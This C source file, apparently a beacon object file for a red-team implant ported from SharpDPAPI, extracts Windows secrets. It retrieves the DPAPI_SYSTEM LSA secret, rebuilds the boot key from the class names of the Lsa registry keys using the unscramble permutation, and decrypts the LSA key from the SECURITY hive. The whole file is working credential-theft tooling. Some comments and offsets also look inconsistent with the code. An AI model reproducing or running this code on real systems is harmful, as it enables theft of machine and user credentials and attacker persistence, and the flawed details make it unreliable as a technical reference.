/*
 * lsadump.c — LSA secret and boot key extraction
 * Ported from SharpDPAPI/lib/LSADump.cs
 */
#include "lsadump.h"
#include "helpers.h"
#include "crypto.h"

/* ---- Get DPAPI_SYSTEM LSA secret ---- */
BOOL get_dpapi_keys(BYTE** dpapi_system_key, int* key_len) {
    BYTE* secret = NULL;
    int secret_len = 0;

    if (!get_lsa_secret(L"DPAPI_SYSTEM", &secret, &secret_len))
        return FALSE;

    if (secret_len < 44) { /* DPAPI_SYSTEM is at least 44 bytes */
        intFree(secret);
        return FALSE;
    }

    /*
     * DPAPI_SYSTEM structure:
     * [0-3]   version
     * [4-23]  machine key (20 bytes)
     * [24-43] user key (20 bytes)
     */
    *key_len = secret_len;
    *dpapi_system_key = secret;
    return TRUE;
}

/* ---- Retrieve LSA secret by name ---- */
BOOL get_lsa_secret(const wchar_t* secret_name, BYTE** out_data, int* out_len) {
    LSA_HANDLE hPolicy = NULL;
    LSA_UNICODE_STRING lusSystemName;
    LSA_UNICODE_STRING lusSecretName;
    LSA_OBJECT_ATTRIBUTES ObjectAttributes;
    PLSA_UNICODE_STRING pPrivateData = NULL;
    NTSTATUS status;
    BOOL result = FALSE;

    /* Initialize object attributes */
    memset(&ObjectAttributes, 0, sizeof(ObjectAttributes));
    memset(&lusSystemName, 0, sizeof(lusSystemName));

    /* Set up secret name */
    lusSecretName.Buffer = (PWSTR)secret_name;
    lusSecretName.Length = (USHORT)(wcslen(secret_name) * sizeof(wchar_t));
    lusSecretName.MaximumLength = lusSecretName.Length + sizeof(wchar_t);

#ifdef BOF
    /* Open LSA policy with POLICY_GET_PRIVATE_INFORMATION access */
    status = ADVAPI32$LsaOpenPolicy(&lusSystemName, &ObjectAttributes,
                                     0x00000004 /* POLICY_GET_PRIVATE_INFORMATION */,
                                     &hPolicy);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "LsaOpenPolicy failed: 0x%08x (Win32: %d)",
                     status, ADVAPI32$LsaNtStatusToWinError(status));
        return FALSE;
    }

    status = ADVAPI32$LsaRetrievePrivateData(hPolicy, &lusSecretName, &pPrivateData);
    if (status != 0 || !pPrivateData || pPrivateData->Length == 0) {
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "LsaRetrievePrivateData failed: 0x%08x",
                         status);
        }
        ADVAPI32$LsaClose(hPolicy);
        return FALSE;
    }

    /* Copy out the secret data */
    *out_len = pPrivateData->Length;
    *out_data = (BYTE*)intAlloc(*out_len);
    if (*out_data) {
        memcpy(*out_data, pPrivateData->Buffer, *out_len);
        result = TRUE;
    }

    ADVAPI32$LsaFreeMemory(pPrivateData);
    ADVAPI32$LsaClose(hPolicy);
#else
    status = LsaOpenPolicy(&lusSystemName, &ObjectAttributes,
                           0x00000004, &hPolicy);
    if (status != 0) return FALSE;

    status = LsaRetrievePrivateData(hPolicy, &lusSecretName, &pPrivateData);
    if (status != 0 || !pPrivateData || pPrivateData->Length == 0) {
        LsaClose(hPolicy);
        return FALSE;
    }

    *out_len = pPrivateData->Length;
    *out_data = (BYTE*)intAlloc(*out_len);
    if (*out_data) {
        memcpy(*out_data, pPrivateData->Buffer, *out_len);
        result = TRUE;
    }

    LsaFreeMemory(pPrivateData);
    LsaClose(hPolicy);
#endif

    return result;
}

/* ---- Get LSA key (for offline decryption) ---- */
BOOL get_lsa_key(BYTE** out_key, int* out_len) {
    /* Read encrypted LSA key from registry and decrypt with boot key */
    BYTE* boot_key = NULL;
    int bk_len = 0;

    if (!get_boot_key(&boot_key, &bk_len))
        return FALSE;

    /* Read encrypted LSA policy key from registry */
    BYTE* enc_key = NULL;
    DWORD ek_len = 0;

    BOOL got_key = get_reg_key_value(
        HKEY_LOCAL_MACHINE,
        L"SECURITY\\Policy\\PolEKList",
        NULL, &enc_key, &ek_len);

    if (!got_key) {
        /* Try legacy path */
        got_key = get_reg_key_value(
            HKEY_LOCAL_MACHINE,
            L"SECURITY\\Policy\\PolSecretEncryptionKey",
            NULL, &enc_key, &ek_len);
    }

    if (!got_key) {
        intFree(boot_key);
        return FALSE;
    }

    /* Decrypt LSA key using boot key */
    /* The exact method depends on Windows version (AES vs DES) */
    /* For Windows 10+, it's AES with SHA256 */
    if (ek_len > 28) {
        /* New format: skip 28-byte header */
        BYTE tmp_key[32];
        lsa_sha256_hash(boot_key, bk_len, enc_key + 28, 32, tmp_key);

        BYTE* dec = NULL;
        int dec_len = 0;
        if (lsa_aes_decrypt(tmp_key, 32, enc_key + 60, ek_len - 60, &dec, &dec_len)) {
            /* Extract the actual key (skip header in decrypted data) */
            if (dec_len >= 68) {
                *out_key = (BYTE*)intAlloc(32);
                if (*out_key) {
                    memcpy(*out_key, dec + 68, 32);
                    *out_len = 32;
                    intFree(dec);
                    intFree(enc_key);
                    intFree(boot_key);
                    return TRUE;
                }
            }
            intFree(dec);
        }
    }

    intFree(enc_key);
    intFree(boot_key);
    return FALSE;
}

/* ---- Get system boot key from SAM registry ---- */
BOOL get_boot_key(BYTE** out_key, int* out_len) {
    /*
     * Boot key is derived from 4 registry values under
     * HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa:
     *   JD, Skew1, GBG, Data
     * Each contributes 2 bytes to the scrambled boot key (8 bytes total → 16 bytes)
     */
    const wchar_t* key_names[] = {
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD",
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1",
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG",
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data"
    };

    BYTE scrambled[16];
    int offset = 0;

    for (int i = 0; i < 4; i++) {
        HKEY hKey = NULL;
        wchar_t class_name[256];
        DWORD class_len = 256;

#ifdef BOF
        if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, key_names[i], 0,
                                    KEY_READ | KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
            return FALSE;

        if (ADVAPI32$RegQueryInfoKeyW(hKey, class_name, &class_len,
                                       NULL, NULL, NULL, NULL, NULL, NULL,
                                       NULL, NULL, NULL) != ERROR_SUCCESS) {
            ADVAPI32$RegCloseKey(hKey);
            return FALSE;
        }
        ADVAPI32$RegCloseKey(hKey);
#else
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, key_names[i], 0,
                          KEY_READ | KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
            return FALSE;

        if (RegQueryInfoKeyW(hKey, class_name, &class_len,
                             NULL, NULL, NULL, NULL, NULL, NULL,
                             NULL, NULL, NULL) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return FALSE;
        }
        RegCloseKey(hKey);
#endif

        /* Class name is a hex string — convert to bytes */
        char hex_str[256];
        for (DWORD j = 0; j < class_len && j < 255; j++) {
            hex_str[j] = (char)class_name[j];
        }
        hex_str[class_len] = 0;

        int blen = 0;
        BYTE* bytes = hex_to_bytes(hex_str, &blen);
        if (!bytes || blen < 4) {
            if (bytes) intFree(bytes);
            return FALSE;
        }

        /* Each key contributes 4 bytes */
        memcpy(scrambled + offset, bytes, 4);
        offset += 4;
        intFree(bytes);
    }

    /* Unscramble the boot key */
    /* The scramble order is a fixed permutation */
    BYTE unscramble[] = {8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7};
    *out_key = (BYTE*)intAlloc(16);
    if (!*out_key) return FALSE;

    for (int i = 0; i < 16; i++) {
        (*out_key)[i] = scrambled[unscramble[i]];
    }
    *out_len = 16;

    return TRUE;
}
